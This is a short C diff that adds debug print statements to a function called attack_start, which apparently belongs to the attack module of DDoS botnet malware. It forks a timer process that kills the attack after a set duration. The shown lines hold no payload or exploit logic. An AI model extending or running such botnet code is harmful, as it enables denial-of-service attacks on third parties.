@@ -168,6 +168,9 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
     else if (pid2 == 0)
     {
         sleep(duration);
+#ifdef DEBUG
+        printf("[attack] end of attack, killing attack\n");
+#endif
         kill(getppid(), 9);
         exit(0);
     }
@@ -187,6 +190,9 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
             }
         }
 
+#ifdef DEBUG
+        printf("[attack] attack ended?\n");
+#endif
         //just bail if the function returns
         exit(0);
     }
